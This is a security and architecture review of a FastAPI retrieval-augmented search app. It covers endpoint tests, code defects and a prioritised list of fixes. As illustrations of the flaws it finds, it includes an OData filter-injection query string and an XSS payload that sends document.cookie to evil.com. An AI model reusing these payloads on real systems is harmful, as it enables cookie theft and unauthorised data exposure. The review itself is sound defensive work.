# Azure IQ Engine — Technical Architecture Review

**Reviewer:** Astra (Technical Architect)  
**Date:** 2026-03-05  
**Version Reviewed:** 0.3.8 (live) / source at `/Users/astra/.openclaw/workspace/azure-iq-engine/`  
**Live Endpoint:** `https://ca-iq-engine-01.icygrass-2e1bb7f3.centralus.azurecontainerapps.io`

---

## Executive Summary

Azure IQ Engine is a well-structured FastAPI RAG application with solid fundamentals: typed Pydantic models throughout, graceful degradation when Azure services are absent, OpenTelemetry instrumentation, per-IP rate limiting, and a cleanly layered ingestion pipeline. For an MVP it punches above its weight.

That said, there are **three issues that need to fix before this app goes to any external audience**: an unauthenticated ingestion trigger endpoint, an OData injection vector in search filters, and an in-process rate limiter that provides no protection with `--workers 2`. A fourth production blocker — a shallow `/health` endpoint that hides real dependency failures — must be addressed before placing this behind any load-balanced or monitored infrastructure.

The review is organized by area, with severity ratings:  
🔴 **CRITICAL** — Fix before any external exposure  
🟠 **HIGH** — Fix before production traffic  
🟡 **MEDIUM** — Fix before GA / scaling  
🔵 **LOW / INFO** — Quality or hygiene improvements

---

## 1. API Design

### 1.1 Endpoint Test Results (Live)

| Endpoint | Method | Status | Notes |
|---|---|---|---|
| `/health` | GET | 200 | Responds, but shallow (see §4.1) |
| `/info` | GET | 200 | Complete, correct schema |
| `/api/sources` | GET | 200 | Faceted counts from AI Search |
| `/api/search?q=azure` | GET | 200 | Semantic search working |
| `/api/search` (no `q`) | GET | 422 | Correct FastAPI validation |
| `/api/search?q=x&top=1000` | GET | 422 | Bounds validation works |
| `/api/query` | POST | 200 | Agent routing + RAG working |
| `/api/query` (no body) | POST | 422 | Correct validation response |
| `/api/research` | POST | 200 | Works but has a bug (§1.3) |
| `/api/ingest/run` | POST | 200 | **Unauthenticated** (§5.1) |
| `/nonexistent` | GET | 404 | Correct |
| `/api/cache/invalidate` (no key) | POST | 200 | **Unauthenticated in default config** (§5.2) |

### 1.2 Response Schema Quality

Generally excellent. Pydantic v2 models are consistently applied with field-level validators, sensible defaults, and range constraints (`ge`, `le`, `min_length`, `max_length`). `X-Cache: HIT/MISS` headers on `/api/query` and `/api/research` are a good operational touch.

One schema inconsistency: `SearchResult.score` has no `le` bound (`ge=0.0` only — `src/api/models.py:113`), yet live scores arrive as `~14.9` (raw BM25 + semantic scores). The `Citation.relevance_score` field is correctly bounded `[0.0, 1.0]`. Scores in `SearchResult` are mapped to `Citation.relevance_score` via `min(r.score, 1.0)` (`main.py:336`) — a silent clamp that loses the true ranking signal. Document the `score` field's semantic meaning or normalise consistently.

### 1.3 🟠 HIGH — Research Endpoint: Raw JSON Leaks into `summary` Field

**Observed live:**
```json
{
  "summary": "{\"summary\": \"Contoso Energy stands at the intersection of legacy grid infrastructure...",
  "iq_opportunities": [],
  "recommended_approach": "Engage IQ specialist for detailed discovery."
}
```

The `_parse_research_json()` function (`main.py:400–432`) falls back to `fallback_summary=raw_answer` when JSON parsing fails. When the Agent Framework workflow path produces valid JSON but the parser throws (likely due to markdown fence wrapping or extra whitespace), the raw JSON string becomes the `summary`. Callers receive malformed output, and `iq_opportunities` is empty when it shouldn't be.

**Fix:** Log the raw LLM output at DEBUG level before parsing so failures are diagnosable. Ensure `_parse_research_json` strips leading/trailing whitespace and tries `json.loads(raw.strip())` before the regex fence extraction. Add an integration test with a representative LLM response fixture.

### 1.4 🔵 INFO — No API Versioning

All routes are unversioned (`/api/query`, not `/api/v1/query`). Acceptable for MVP but plan versioning before external consumption. Consider an `api-version` header or `/v1/` prefix pattern.

### 1.5 🔵 INFO — Content-Type Enforcement Missing on Some Routes

`GET /api/search?q=…&source_type=…` accepts `source_type` as a raw string without any validation against a known enum. Invalid values silently produce no results (the OData filter returns empty). Return a 400 with allowed values list instead.

---

## 2. Code Quality

### 2.1 Error Handling

The broad exception catching pattern (`except Exception as exc: # noqa: BLE001`) is used extensively and correctly: failures are logged with context, partially accumulated results are preserved, and execution continues. This is appropriate for a fault-tolerant ingestion pipeline.

The API layer raises `HTTPException(502)` on `httpx.HTTPError` for both Search and OpenAI calls (`main.py:247`, `main.py:319`). This is correct — the upstream is the one that failed, not the client. 

**One gap:** `_call_openai()` at `main.py:303` accesses `data["choices"][0]["message"]["content"]` without defensive KeyError handling. If the Azure OpenAI response is malformed (e.g., content filtering triggered, empty choices array), this raises an unhandled `KeyError` or `IndexError` that becomes an unformatted 500 instead of a clean 502.

```python
# main.py:303 — unguarded access
answer = data["choices"][0]["message"]["content"]
```

**Fix:**
```python
choices = data.get("choices") or []
if not choices:
    raise HTTPException(status_code=502, detail="LLM returned empty response")
answer = choices[0].get("message", {}).get("content", "")
```

### 2.2 🟠 HIGH — OData Injection in Search Filter Construction

**File:** `src/api/main.py:220–224`

```python
filters: list[str] = []
if source_type:
    filters.append(f"source_type eq '{source_type}'")
if iq_layer:
    filters.append(f"iq_layers/any(l: l eq '{iq_layer}')")
```

`source_type` and `iq_layer` arrive as raw user-supplied query parameters and are interpolated directly into OData filter expressions without sanitization. A crafted request like:

```
GET /api/search?q=test&source_type=ms-learn' or 1 eq 1 and 'a' eq '
```

produces the filter string `source_type eq 'ms-learn' or 1 eq 1 and 'a' eq ''` — a valid OData expression that bypasses the intended source filter and returns all documents regardless of type.

While Azure AI Search is not a SQL engine (no data mutation possible), this can expose documents across source types or IQ layers that should be scoped. More importantly, the same pattern applied to a full-text search `$filter` could leak data across tenants in a multi-tenant scenario.

**Fix:** Validate `source_type` and `iq_layer` against an allow-list of known values:

```python
VALID_SOURCE_TYPES = frozenset(["ms-learn", "blog-post", "video-transcript", "azure-update", "azure-docs"])
VALID_IQ_LAYERS = frozenset(["work-iq", "fabric-iq", "foundry-iq", "azure-core"])

if source_type and source_type not in VALID_SOURCE_TYPES:
    raise HTTPException(status_code=400, detail=f"Invalid source_type. Valid: {sorted(VALID_SOURCE_TYPES)}")
```

### 2.3 Async Correctness

Generally correct. All I/O paths use `async with httpx.AsyncClient()` — no blocking `requests` calls. `asyncio.create_task()` is used correctly for fire-and-forget ingestion (`main.py:1118`).

**One concern:** `asyncio.create_task()` without task retention reference (`main.py:1118`). The task is stored only in `_jobs` as a status dict, not as the actual Task object. If the FastAPI server is shut down mid-ingestion, the task is abandoned with no graceful cleanup. The job status in `_jobs` will be stale as `"running"` forever.

**Fix:** Store the `asyncio.Task` reference and cancel it on `lifespan` shutdown:

```python
_active_tasks: set[asyncio.Task] = set()

task = asyncio.create_task(_run_ingestion(job_id, req))
_active_tasks.add(task)
task.add_done_callback(_active_tasks.discard)
```

### 2.4 Type Safety

Strong overall. `from __future__ import annotations` throughout. Pydantic v2 with `model_config`. One weakness: `background_tasks=None` parameter on `ingest_run()` at `main.py:1096` has no type annotation and is never used (FastAPI's `BackgroundTasks` injection is not wired):

```python
async def ingest_run(req: IngestRunRequest, background_tasks=None) -> IngestJobStatus:
```

This parameter is dead code — ingestion uses `asyncio.create_task()` directly. Remove it to avoid confusion.

### 2.5 Logging Quality

Good structured logging with `%s` interpolation (no f-string-in-logging anti-pattern). Log levels are appropriate. The `__name__`-based logger hierarchy is correctly established.

**Gap:** No correlation/request ID is injected into log records. With `--workers 2`, concurrent request logs are interleaved with no way to trace a single request end-to-end in Application Insights. Add a middleware that generates a UUID `X-Request-ID` and injects it into a `contextvars` context for log filtering.

---

## 3. Architecture

### 3.1 Ingestion Pipeline Overview

```
Crawlers (concurrent) → Normalise → Chunk → Deduplicate → Embed → Index
    mslearn / youtube / azure_updates / techcommunity / azure411
```

The pipeline is clean and well-separated. ADR references (ADR-001, ADR-002, ADR-003, ADR-005) are cited in source files, indicating deliberate design decisions were documented. Fault isolation per-document is correctly implemented.

### 3.2 🟠 HIGH — In-Process Rate Limiter Not Shared Across Workers

**File:** `src/api/rate_limit.py:47`  
**Dockerfile:** `--workers 2`

The `RateLimitMiddleware` stores its sliding-window state in a process-local `defaultdict` (`self._windows`). With `--workers 2` in the Dockerfile, each worker process has an independent rate-limit window. A client making 30 requests/minute to `/api/query` can exceed the limit by factor N-workers (effectively 60 RPM with 2 workers).

Container Apps can also scale to multiple replicas, compounding this further.

**Fix:** Replace in-process window with a Redis-backed implementation (Redis sorted-set sliding window or token bucket). The Redis connection is already configured and available via `settings.redis_url`. This is a known MVP trade-off (file docstring says "Replace with Redis-backed... for production") — the critical part is tracking this against a pre-scale milestone.

### 3.3 🟠 HIGH — In-Process Job Store (`_jobs`) Not Durable

**File:** `src/api/main.py:56`

```python
_jobs: dict[str, IngestJobStatus] = {}
```

Job state is stored in process memory. Any Container Apps restart, scale-in event, or worker rotation silently loses all job history. A client polling `/api/ingest/status/{job_id}` after a restart receives `{"status": "not_found"}` for a job that completed successfully. Job deduplication is also impossible — the same source can be ingested concurrently by separate requests.

The docstring calls this out: "Replace with Azure Table Storage or Service Bus for production." This is a pre-scale blocker.

**Fix:** Persist job status to Azure Table Storage (simple, cheap, already in the Azure stack). Use a distributed lock (Redis or Blob lease) to prevent concurrent ingestion of the same source.

### 3.4 🟡 MEDIUM — Orchestrator Deduplication Is Non-Functional

**File:** `src/ingestion/orchestrator.py:484–511`

The orchestrator's Step 3 (`_step_deduplicate`) initializes `existing_fps = {}` as an empty dict and then filters against it — which means it never actually skips any chunks:

```python
existing_fps: dict[str, str] = {}
# ... no code populates existing_fps ...
for chunk in chunks:
    fp = chunk.get("fingerprint", "")
    if fp and fp in existing_fps:   # Always False — dict is always empty
        skipped += 1
    else:
        new_chunks.append(chunk)     # All chunks pass through
```

Actual deduplication happens correctly in `SearchIndexer._fetch_existing_fingerprints()` (indexer.py:119), which queries the live index. The orchestrator-level step is dead code that produces misleading log output (`"Deduplication: N to index, 0 skipped"` every run).

**Impact:** No incorrect behavior — all chunks still flow to the indexer which deduplicates correctly. But orchestrator-level stats are wrong, embedding cost is not saved at the orchestrator level, and the step log is misleading.

**Fix:** Either remove the orchestrator-level dedup step and log that the indexer handles it, or populate `existing_fps` from the indexer before the embed step.

### 3.5 🟡 MEDIUM — Checkpoint Reliability: Resume Depends on File System

Checkpoints are stored as local JSON files in `./checkpoints/` (`orchestrator.py:95`). Container Apps containers are ephemeral — local file system state is lost on every restart or replica swap. Long crawl runs that are interrupted cannot resume from where they left off.

**Fix:** Write checkpoint files to an Azure Storage Account (Blob or File Share mounted via volume). Container Apps supports persistent volume mounts via Azure Files.

### 3.6 🔵 INFO — All Crawlers Run in a Single asyncio Event Loop

`_step_crawl()` (`orchestrator.py:186`) creates tasks and awaits them serially with `await task`. While this is concurrent (tasks are created before any await), CPU-bound work (HTML parsing, regex) in crawlers will block the event loop. For large crawls this is fine, but for production ingestion consider `run_in_executor` for parse-heavy operations.

### 3.7 🔵 INFO — Sentence Splitter Has Lambda Closure Bug

**File:** `src/ingestion/chunker.py:208–215`

```python
for abbr in _ABBREVIATIONS:
    pattern = re.compile(r"\b" + re.escape(abbr) + r"\.", re.IGNORECASE)
    for m in pattern.finditer(masked):
        token = f"__ABBR_{len(placeholders)}__"
        placeholders.append((token, m.group()))
    masked = pattern.sub(
        lambda m, _abbr=abbr: f"__ABBR_{len(placeholders) - 1}__",  # noqa
        masked,
    )
```

This loop body runs twice (lines 208–215 and then again at 218–221 with a fresh `masked = text`). The first loop body is dead code — `masked` is reset at line 219. The `placeholders` list is also never consumed for unmasking (the actual unmasking at line 230 uses a different approach). This is confusing but not functionally broken because the second pass is the correct implementation.

---

## 4. Operational Readiness

### 4.1 🟠 HIGH — Health Endpoint Provides No Dependency Signal

**File:** `src/api/main.py:709–712`

```python
@app.get("/health", response_model=HealthResponse, tags=["Health"])
async def health() -> HealthResponse:
    """Liveness check — always 200 when the process is alive."""
    return HealthResponse(version=get_settings().app_version)
```

The health endpoint only confirms the process is running. It does not probe Azure AI Search, Azure AI Foundry, or Redis. Container Apps, Azure Load Balancer, and monitoring tools (Application Insights availability tests) all rely on this endpoint for routing and alerting. A crashed Redis connection, expired Search API key, or Foundry endpoint misconfiguration would return HTTP 200 — healthy — while all queries fail with 502.

**Live response:** `{"status":"healthy","version":"0.3.8"}` — confirmed no dependency checks.

**Fix:** Add a readiness probe variant that checks dependencies with short timeouts:

```python
@app.get("/health/ready", tags=["Health"])
async def health_ready():
    checks = {}
    # AI Search ping (HEAD on the index)
    if settings.has_search:
        try:
            async with httpx.AsyncClient(timeout=3.0) as c:
                r = await c.get(f"{settings.search_endpoint}/indexes/{settings.search_index_name}?api-version=2024-07-01",
                                headers={"api-key": settings.search_api_key})
                checks["search"] = "ok" if r.status_code < 400 else f"http_{r.status_code}"
        except Exception as e:
            checks["search"] = f"error: {e}"
    # Redis ping
    from .cache import _get_client
    client = await _get_client()
    checks["cache"] = "ok" if client else "unavailable"
    
    degraded = any(v != "ok" and v != "unavailable" for v in checks.values())
    return JSONResponse({"status": "degraded" if degraded else "ok", "checks": checks},
                        status_code=503 if degraded else 200)
```

Keep `/health` as a pure liveness probe (no dependencies). Register `/health/ready` as the Container Apps readiness probe.

### 4.2 🟡 MEDIUM — No Structured Request Logging / Correlation ID

The telemetry middleware (`main.py:136`) traces each request with OpenTelemetry spans but does not inject a correlation ID into response headers or log context. With multiple workers and replicas, log correlation is impossible without a `traceId`.

**Fix:** Add a `X-Request-ID` middleware that generates a UUID, attaches it to the span, and returns it in the response header. Inject it into Python's log context via `contextvars`.

### 4.3 🟡 MEDIUM — Ingestion Has No Timeout Guard

`_run_ingestion()` (`main.py:635`) runs as an `asyncio.Task` with no timeout. A hung crawler (e.g., a slow-responding website during `mslearn` crawl) can hold the task open indefinitely, accumulating memory and preventing clean shutdown.

**Fix:** Wrap the `run_ingestion()` call in `asyncio.wait_for(run_ingestion(...), timeout=3600.0)`.

### 4.4 🟡 MEDIUM — Cache Is Completely Disabled in Production (No Redis Configured)

Confirmed by live endpoint: `/api/query` response headers show `X-Cache: MISS` on every request. The `REDIS_URL` environment variable is not set in the Container App configuration, so all caching is a no-op. This means every query hits Azure OpenAI, incurring full token cost and latency for repeated identical questions.

For a demo app this is fine; for production, provision an Azure Cache for Redis (Basic C0 is ~$15/month) and set `REDIS_URL`.

### 4.5 🔵 INFO — No X-RateLimit Headers on Search Endpoint

The `RateLimitMiddleware` injects `X-RateLimit-Limit` and `X-RateLimit-Remaining` headers only for matched rules (query, research). `GET /api/search` is not rate-limited at all. Add a rule for `/api/search` (e.g., 60 RPM).

---

## 5. Security

### 5.1 🔴 CRITICAL — Ingestion Endpoint Is Unauthenticated

**File:** `src/api/main.py:1095–1128`

```python
@app.post("/api/ingest/run", response_model=IngestJobStatus, tags=["Ingestion"])
async def ingest_run(req: IngestRunRequest, background_tasks=None) -> IngestJobStatus:
```

No authentication dependency is attached. Any unauthenticated caller can trigger a full ingestion run, which:
1. Spawns a background task that crawls external websites
2. Calls Azure OpenAI embedding API (token cost)
3. Writes to Azure AI Search (index modification)
4. With `force_recrawl=True`, blows away checkpoint state

**Confirmed live:** `POST /api/ingest/run` with `{"sources": ["mslearn"], "dry_run": true}` returned `200 OK` with a job ID — no credentials required.

**Fix:** Apply the same `_require_admin_key` dependency used on `/api/cache/invalidate`:

```python
@app.post("/api/ingest/run",
          response_model=IngestJobStatus,
          tags=["Ingestion"],
          dependencies=[Depends(_require_admin_key)])
async def ingest_run(req: IngestRunRequest) -> IngestJobStatus:
```

Also apply to `/api/ingest/status/{job_id}` to prevent job enumeration.

### 5.2 🟠 HIGH — Admin API Key Defaults to Empty (Cache Invalidate Unauthenticated)

**File:** `src/api/settings.py:104` and `src/api/main.py:1144`

```python
admin_api_key: str = Field(default="", ...)
```

```python
def _require_admin_key(x_admin_key: str | None = Header(default=None)) -> None:
    required = settings.admin_api_key
    if required and x_admin_key != required:   # ← only checks if required is non-empty
        raise HTTPException(...)
```

When `ADMIN_API_KEY` is not set (default), `required` is `""` which is falsy, so the check short-circuits and all callers are admitted. This is intentional for local dev but must be enforced in any environment with external access.

**Confirmed live:** `POST /api/cache/invalidate {"pattern": "*"}` returned `200 OK` with no credentials.

**Fix:** Require `ADMIN_API_KEY` to be set in production. Add a startup check:

```python
# In lifespan
if not settings.admin_api_key and not settings.debug:
    logger.warning("ADMIN_API_KEY is not set — admin endpoints are open to the internet")
```

For Container Apps: set `ADMIN_API_KEY` as a secret-backed environment variable.

### 5.3 🟠 HIGH — OData Filter Injection (Cross-References §2.2)

See §2.2. The `source_type` and `iq_layer` query parameters on `GET /api/search` are interpolated raw into OData `$filter` expressions. An attacker can craft filter strings that expand the result set beyond the intended scope.

### 5.4 🟡 MEDIUM — CORS: Wildcard Origin Allows Any Domain

**File:** `src/api/settings.py:92`

```python
cors_origins: list[str] = Field(default=["*"], ...)
```

**File:** `src/api/main.py:111`

```python
app.add_middleware(CORSMiddleware, allow_origins=settings.cors_origins, allow_credentials=True, ...)
```

`allow_credentials=True` combined with `allow_origins=["*"]` is rejected by browsers (CORS spec prohibits credential sharing with wildcard origin), but it signals intent to allow any site to make credentialed requests when a specific origin is configured. More immediately, the wildcard allows any web page to call the API and read responses.

**Fix:** Set `cors_origins` to the specific domains that host the web UI (e.g., the Container Apps FQDN and any custom domain).

### 5.5 🟡 MEDIUM — Missing HTTP Security Headers

Live response from `/health`:

```
server: uvicorn
content-type: application/json
```

Missing:
- `Content-Security-Policy` — no CSP on the web UI
- `X-Content-Type-Options: nosniff`
- `X-Frame-Options: DENY` (or `frame-ancestors 'none'` in CSP)
- `Referrer-Policy: strict-origin-when-cross-origin`
- `Permissions-Policy`
- Server header reveals `uvicorn` (minor — consider hiding with nginx or AGFW proxy)

**Fix:** Add a security headers middleware:

```python
@app.middleware("http")
async def _security_headers(request: Request, call_next):
    response = await call_next(request)
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["X-Frame-Options"] = "DENY"
    response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
    return response
```

For the web UI, add a `Content-Security-Policy` header that restricts script sources.

### 5.6 🟡 MEDIUM — Web UI renderMarkdown: Unescaped LLM Content in Heading/List Substitutions

**File:** `src/static/index.html:369–385`

```javascript
function renderMarkdown(text) {
  let html = text
    .replace(/^### (.+)$/gm, '<h3>$1</h3>')    // $1 is NOT escaped
    .replace(/^## (.+)$/gm, '<h2>$1</h2>')
    .replace(/^# (.+)$/gm, '<h1>$1</h1>')
    .replace(/\*\*(.+?)\*\*/g, '<strong>$1</strong>')  // $1 is NOT escaped
    .replace(/^\s*[-*] (.+)$/gm, '<li>$1</li>')        // $1 is NOT escaped
    .replace(/\[([^\]]+)\]\(([^)]+)\)/g, '<a href="$2" ...>$1</a>');  // $1, $2 NOT escaped
```

Heading text, bold text, list items, and link targets are substituted directly without HTML-escaping. If the LLM produces a response containing:

```
## <img src=x onerror="fetch('https://evil.com?c='+document.cookie)">
```

This renders as `<h2><img src=x onerror="..."></h2>` — a stored XSS vector via LLM response content.

While the LLM content comes from a controlled API (not directly from user input), prompt injection attacks on the RAG pipeline or corpus poisoning could weaponize this. The attack surface is real, not theoretical.

`escHtml()` exists and is correctly used for user message bubbles (`line:601`) and error messages (`line:827`), but not applied to heading/list/link substitution groups.

**Fix:**

```javascript
function renderMarkdown(text) {
  const e = escHtml;
  let html = text
    .replace(/```(\w*)\n?([\s\S]*?)```/g, (_, lang, code) =>
      `<pre><code class="${e(lang) || ''}">${e(code.trim())}</code></pre>`)
    .replace(/`([^`]+)`/g, (_, c) => `<code>${e(c)}</code>`)
    .replace(/^### (.+)$/gm, (_, t) => `<h3>${e(t)}</h3>`)
    .replace(/^## (.+)$/gm,  (_, t) => `<h2>${e(t)}</h2>`)
    .replace(/^# (.+)$/gm,   (_, t) => `<h1>${e(t)}</h1>`)
    .replace(/\*\*\*(.+?)\*\*\*/g, (_, t) => `<strong><em>${e(t)}</em></strong>`)
    .replace(/\*\*(.+?)\*\*/g,     (_, t) => `<strong>${e(t)}</strong>`)
    .replace(/\*(.+?)\*/g,          (_, t) => `<em>${e(t)}</em>`)
    .replace(/^\s*[-*] (.+)$/gm,    (_, t) => `<li>${e(t)}</li>`)
    .replace(/\[([^\]]+)\]\(([^)]+)\)/g,
      (_, label, href) => `<a href="${e(href)}" target="_blank" rel="noopener">${e(label)}</a>`)
    // ... rest unchanged
}
```

### 5.7 🔵 LOW — Bing Grounding Key Embedded in Foundry Payload

**File:** `src/api/main.py:472–480`

```python
"data_sources": [{
    "type": "bing_grounding",
    "parameters": {
        "key": settings.bing_grounding_key,
        ...
    }
}]
```

The Bing Grounding key is sent in the request payload to the Foundry endpoint. This is the documented Azure API pattern, but it means the key is in transit over HTTPS within Azure's network. Ensure the key has the minimum required permissions (read-only, Grounding only). Prefer the `bing_grounding_connection_id` approach (using a Foundry-managed connection) which avoids passing the key in-band.

### 5.8 🔵 LOW — Server Header Discloses Runtime

```
server: uvicorn
```

This reveals the ASGI server type and version. Minor but eliminates one reconnaissance step. Use a reverse proxy (Azure Application Gateway or nginx) in front, which rewrites the Server header.

---

## 6. Summary & Priority Matrix

| # | Finding | Severity | File | Fix Effort |
|---|---|---|---|---|
| 5.1 | Ingestion endpoint unauthenticated | 🔴 CRITICAL | `main.py:1095` | 30 min |
| 2.2 | OData filter injection | 🟠 HIGH | `main.py:220-224` | 1 hr |
| 3.2 | Rate limiter not shared across workers | 🟠 HIGH | `rate_limit.py:47` | 1 day |
| 4.1 | Health endpoint: no dependency checks | 🟠 HIGH | `main.py:709` | 2 hrs |
| 1.3 | Research summary leaks raw JSON | 🟠 HIGH | `main.py:400-432` | 2 hrs |
| 5.2 | Admin key defaults to empty | 🟠 HIGH | `settings.py:104` | 30 min |
| 3.3 | In-process job store not durable | 🟠 HIGH | `main.py:56` | 1-2 days |
| 5.6 | Web UI: XSS via unescaped LLM markdown | 🟡 MEDIUM | `index.html:369` | 1 hr |
| 5.4 | CORS wildcard | 🟡 MEDIUM | `settings.py:92` | 15 min |
| 5.5 | Missing HTTP security headers | 🟡 MEDIUM | `main.py` | 1 hr |
| 3.4 | Orchestrator dedup is non-functional | 🟡 MEDIUM | `orchestrator.py:484` | 2 hrs |
| 3.5 | Checkpoint state lost on restart | 🟡 MEDIUM | `orchestrator.py:95` | 1 day |
| 4.2 | No request correlation ID | 🟡 MEDIUM | `main.py` | 2 hrs |
| 4.3 | Ingestion task has no timeout | 🟡 MEDIUM | `main.py:635` | 30 min |
| 2.3 | `asyncio.Task` not retained (shutdown safety) | 🟡 MEDIUM | `main.py:1118` | 1 hr |
| 2.1 | Unguarded `choices[0]` access in `_call_openai` | 🟡 MEDIUM | `main.py:303` | 30 min |
| 4.4 | Redis not configured (cache disabled live) | 🟡 MEDIUM | env config | 1 hr |
| 1.4 | No API versioning | 🔵 LOW | architecture | Pre-GA |
| 5.7 | Bing key in-band (prefer connection ID) | 🔵 LOW | `main.py:472` | 1 hr |
| 5.8 | Server header disclosure | 🔵 LOW | infra | 30 min |
| 3.7 | Dead code in sentence splitter | 🔵 LOW | `chunker.py:208` | 30 min |

---

## 7. What's Working Well

- **Graceful degradation throughout**: missing Search, Foundry, Redis, or Bing all degrade to progressively simpler behavior with clear log warnings rather than crashing. This is production-quality design.
- **Pydantic v2 models**: consistent, well-typed, with field-level validators. 422 responses are informative and machine-parseable.
- **Telemetry wiring**: OpenTelemetry + Azure Monitor exporter is correctly wired with a complete no-op fallback. Custom metrics (`query_duration`, `query_tokens`, `cache_hits`) are the right signals.
- **Content-type-aware chunking**: heading-aware DocumentChunker, timestamp-aware TranscriptChunker, and AtomicChunker are well-separated and correctly routed. 512-token chunks with 128-token overlap is a solid default for semantic search.
- **Fault-isolated ingestion**: per-document exception handling in all five pipeline steps means one bad document never stops the run.
- **Agent routing**: keyword-based router is simple, transparent, and overrideable. Appropriate for MVP; the fallback to direct RAG when agents are unavailable is clean.
- **Settings via Pydantic Settings**: all credentials arrive from environment variables. No hardcoded secrets found in any source file.

---

*Review completed: 2026-03-05 | Next review recommended: post 0.4.0 or before first external customer demo*
